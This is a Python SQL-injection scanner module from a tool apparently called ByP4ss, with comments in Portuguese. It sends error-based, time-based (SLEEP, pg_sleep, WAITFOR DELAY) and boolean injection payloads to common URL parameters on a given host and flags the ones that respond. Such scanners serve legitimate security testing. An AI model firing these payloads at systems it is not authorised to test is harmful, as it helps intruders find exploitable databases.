# SqliScan do ByP4ss
# Detecta SQL injection (error-based, time-based, boolean).
# Chamado por: ByP4ss.py --sqli, ou SqliScan.Escanear(Alvo).
# Nao executa comando. So HTTP GET com payloads.
#
# Se o binario Go (Discovery/sqliscan/sqliscan) existir, delega.
# Senao, cai no Python puro (mesmo resultado, mais lento).

import os
import sys
import time
import json
import socket
import subprocess
import urllib.parse
import concurrent.futures

from Core.Config import Config
from Core.Log import Log


class SqliScan:

    PAYLOADS_ERROR = [
        "'", "''", "';", "'; --", "' OR '1'='1", "' OR 1=1 --",
        "' UNION SELECT NULL --", "' UNION SELECT NULL,NULL --",
        "') OR ('1'='1", "\" OR \"\"=\"", "` OR 1=1 --",
        "') OR 1=1 --", "1' AND '1'='1", "1' AND '1'='2",
    ]

    PAYLOADS_TIME = [
        ("' AND SLEEP(5) --", "mysql", 5),
        ("'; SELECT pg_sleep(5) --", "postgres", 5),
        ("'; WAITFOR DELAY '0:0:5' --", "mssql", 5),
        ("' OR SLEEP(5) --", "mysql", 5),
        ("1' AND SLEEP(5) AND '1'='1", "mysql", 5),
    ]

    PAYLOAD_BOOL_TRUE = "' AND 1=1 --"
    PAYLOAD_BOOL_FALSE = "' AND 1=2 --"

    PALAVRAS_ERRO = [
        "sql syntax", "mysql_fetch", "ora-", "postgresql",
        "sqlite", "microsoft ole db", "unclosed quotation",
        "syntax error", "warning: mysql", "division by zero",
        "you have an error in your sql", "invalid query",
        "mysql_num_rows", "pg_query", "sqlite3::",
    ]

    PARAMS_PADRAO = ["id", "page", "cat", "user", "q", "query", "search",
                     "item", "product", "article", "post", "action"]

    TIMEOUT = 3.0
    LIMIAR_SLEEP = 4.0
    LIMIAR_BOOL = 100
    BINARIO_GO = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                              "sqliscan", "sqliscan")

    @staticmethod
    def Escanear(Alvo, Porta=80, Path="/", Params=None, Threads=5):
        Inicio = time.monotonic()
        Resultado = {
            "ok": False, "alvo": Alvo, "porta": int(Porta),
            "vulneraveis": [], "total": 0, "testados": 0,
            "duracao_s": 0.0, "via": "python",
        }
        if not Alvo:
            Resultado["motivo"] = "alvo_ausente"
            return Resultado
        if SqliScan._BinarioDisponivel():
            R = SqliScan._ChamarGo(Alvo, Porta, Path, Params, Threads)
            if R.get("ok"):
                Resultado.update({
                    "ok": True, "vulneraveis": R.get("vulneraveis", []),
                    "total": R.get("total", 0),
                    "testados": R.get("testados", 0),
                    "via": "go", "duracao_s": R.get("duracao_s", 0.0),
                })
                Log.Info("sqliscan via go", {"alvo": Alvo,
                                              "total": Resultado["total"]})
                return Resultado
            Log.Aviso("sqliscan go falhou, caindo no python",
                      {"motivo": R.get("motivo")})
        Params = Params or SqliScan.PARAMS_PADRAO
        Vulneraveis = SqliScan._EscanearPython(Alvo, Porta, Path, Params, Threads)
        Resultado["vulneraveis"] = Vulneraveis
        Resultado["total"] = len(Vulneraveis)
        Resultado["testados"] = R.get("testados", 0) if False else SqliScan._UltimoTestados
        Resultado["ok"] = True
        Resultado["duracao_s"] = round(time.monotonic() - Inicio, 2)
        Log.Info("sqliscan via python", {
            "alvo": Alvo, "vulneraveis": len(Vulneraveis),
            "testados": Resultado["testados"],
        })
        return Resultado

    _UltimoTestados = 0

    @staticmethod
    def _BinarioDisponivel():
        return os.path.isfile(SqliScan.BINARIO_GO) and os.access(SqliScan.BINARIO_GO, os.X_OK)

    @staticmethod
    def _ChamarGo(Alvo, Porta, Path, Params, Threads):
        Req = {
            "alvo": Alvo, "porta": int(Porta), "path": Path,
            "params": Params or SqliScan.PARAMS_PADRAO, "threads": int(Threads),
        }
        try:
            R = subprocess.run(
                [SqliScan.BINARIO_GO],
                input=json.dumps(Req) + "\n",
                capture_output=True, text=True, timeout=60,
            )
            if R.returncode != 0:
                return {"ok": False, "motivo": f"exit_{R.returncode}",
                        "erro": R.stderr[:300]}
            D = json.loads(R.stdout)
            if not isinstance(D, dict):
                return {"ok": False, "motivo": "resposta_invalida"}
            return D
        except subprocess.TimeoutExpired:
            return {"ok": False, "motivo": "timeout_60s"}
        except Exception as E:
            return {"ok": False, "motivo": f"excecao:{type(E).__name__}",
                    "erro": str(E)}

    @staticmethod
    def _EscanearPython(Alvo, Porta, Path, Params, Threads):
        Tarefas = []
        for Param in Params:
            for Payload in SqliScan.PAYLOADS_ERROR:
                Tarefas.append(("error", Param, Payload))
            for Payload, SGBD, Espera in SqliScan.PAYLOADS_TIME:
                Tarefas.append(("time", Param, Payload))
            Tarefas.append(("bool_true", Param, SqliScan.PAYLOAD_BOOL_TRUE))
            Tarefas.append(("bool_false", Param, SqliScan.PAYLOAD_BOOL_FALSE))
        SqliScan._UltimoTestados = len(Tarefas)
        Vulneraveis = []
        BoolCache = {}
        with concurrent.futures.ThreadPoolExecutor(max_workers=max(1, int(Threads))) as Ex:
            Futuros = {}
            for Tipo, Param, Payload in Tarefas:
                F = Ex.submit(SqliScan._TestarPayload, Alvo, Porta, Path, Param, Payload)
                Futuros[F] = (Tipo, Param, Payload)
            for F in concurrent.futures.as_completed(Futuros):
                Tipo, Param, Payload = Futuros[F]
                try:
                    R = F.result()
                except Exception:
                    continue
                if Tipo == "error":
                    V = SqliScan._AvaliarError(R, Param, Payload)
                    if V:
                        Vulneraveis.append(V)
                elif Tipo == "time":
                    V = SqliScan._AvaliarTime(R, Param, Payload)
                    if V:
                        Vulneraveis.append(V)
                elif Tipo == "bool_true":
                    BoolCache.setdefault(Param, {})["true"] = R
                elif Tipo == "bool_false":
                    BoolCache.setdefault(Param, {})["false"] = R
        for Param, Cache in BoolCache.items():
            V = SqliScan._AvaliarBool(Cache.get("true"), Cache.get("false"), Param)
            if V:
                Vulneraveis.append(V)
        return Vulneraveis

    @staticmethod
    def _TestarPayload(Alvo, Porta, Path, Param, Payload):
        Sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        Sock.settimeout(SqliScan.TIMEOUT)
        Inicio = time.monotonic()
        try:
            if Sock.connect_ex((Alvo, int(Porta))) != 0:
                return {"ok": False, "motivo": "conexao_falhou"}
            ValorEnc = urllib.parse.quote(Payload, safe="")
            Sep = "&" if "?" in Path else "?"
            Url = f"{Path}{Sep}{Param}={ValorEnc}"
            Req = (f"GET {Url} HTTP/1.0\r\nHost: {Alvo}\r\n"
                   f"Connection: close\r\n\r\n")
            Sock.sendall(Req.encode("utf-8", errors="replace"))
            Dados = Sock.recv(16384)
            Lat = round(time.monotonic() - Inicio, 2)
            return {
                "ok": True,
                "status": SqliScan._Status(Dados),
                "tamanho": len(Dados),
                "latencia": Lat,
                "corpo": Dados[:8192].decode("utf-8", errors="replace"),
            }
        except socket.timeout:
            return {"ok": False, "motivo": "timeout",
                    "latencia": round(time.monotonic() - Inicio, 2)}
        except Exception as E:
            return {"ok": False, "motivo": type(E).__name__}
        finally:
            try: Sock.close()
            except Exception: pass

    @staticmethod
    def _Status(Dados):
        if not Dados:
            return 0
        try:
            P = Dados.split(b"\r\n", 1)[0].decode("utf-8", errors="replace").split()
            if len(P) >= 2:
                return int(P[1])
        except Exception:
            pass
        return 0

    @staticmethod
    def _AvaliarError(R, Param, Payload):
        if not R.get("ok"):
            return None
        Corpo = (R.get("corpo") or "").lower()
        Achou = next((P for P in SqliScan.PALAVRAS_ERRO if P in Corpo), None)
        Status = R.get("status", 0)
        if Achou:
            return {"param": Param, "payload": Payload[:60], "tipo": "error_based",
                    "evidencia": Achou, "status": Status, "severidade": "alta"}
        if Status >= 500 and any(C in Payload for C in "'\""):
            return {"param": Param, "payload": Payload[:60], "tipo": "error_5xx",
                    "evidencia": f"status {Status}", "status": Status,
                    "severidade": "media"}
        return None

    @staticmethod
    def _AvaliarTime(R, Param, Payload):
        if R.get("ok"):
            Lat = R.get("latencia", 0)
            if Lat >= SqliScan.LIMIAR_SLEEP:
                return {"param": Param, "payload": Payload[:60],
                        "tipo": "time_based", "evidencia": f"latencia {Lat}s",
                        "latencia": Lat, "severidade": "critica"}
        elif R.get("motivo") == "timeout":
            Lat = R.get("latencia", 0)
            if Lat >= SqliScan.LIMIAR_SLEEP:
                return {"param": Param, "payload": Payload[:60],
                        "tipo": "time_based_timeout",
                        "evidencia": f"timeout {Lat}s",
                        "latencia": Lat, "severidade": "critica"}
        return None

    @staticmethod
    def _AvaliarBool(RTrue, RFalse, Param):
        if not RTrue or not RFalse:
            return None
        if not RTrue.get("ok") or not RFalse.get("ok"):
            return None
        T1 = RTrue.get("tamanho", 0)
        T2 = RFalse.get("tamanho", 0)
        Dif = abs(T1 - T2)
        if Dif >= SqliScan.LIMIAR_BOOL:
            return {"param": Param, "payload": f"{SqliScan.PAYLOAD_BOOL_TRUE} vs {SqliScan.PAYLOAD_BOOL_FALSE}",
                    "tipo": "boolean", "tamanho_true": T1, "tamanho_false": T2,
                    "diferenca": Dif, "evidencia": f"diferenca {Dif} bytes",
                    "severidade": "alta"}
        return None

    @staticmethod
    def Info():
        return {
            "nome": "SqliScan",
            "error_payloads": len(SqliScan.PAYLOADS_ERROR),
            "time_payloads": len(SqliScan.PAYLOADS_TIME),
            "params_padrao": SqliScan.PARAMS_PADRAO,
            "binario_go": SqliScan.BINARIO_GO,
            "go_disponivel": SqliScan._BinarioDisponivel(),
        }


if __name__ == "__main__":
    import sys as S, json as J
    if len(S.argv) > 1 and S.argv[1] == "teste":
        Alvo = S.argv[2] if len(S.argv) > 2 else "127.0.0.1"
        Porta = int(S.argv[3]) if len(S.argv) > 3 else 80
        print(f"sqliscan {Alvo}:{Porta}")
        R = SqliScan.Escanear(Alvo, Porta)
        print(J.dumps(R, indent=2, ensure_ascii=False, default=str))
    else:
        print("uso: python3 Discovery/SqliScan.py teste [alvo] [porta]")
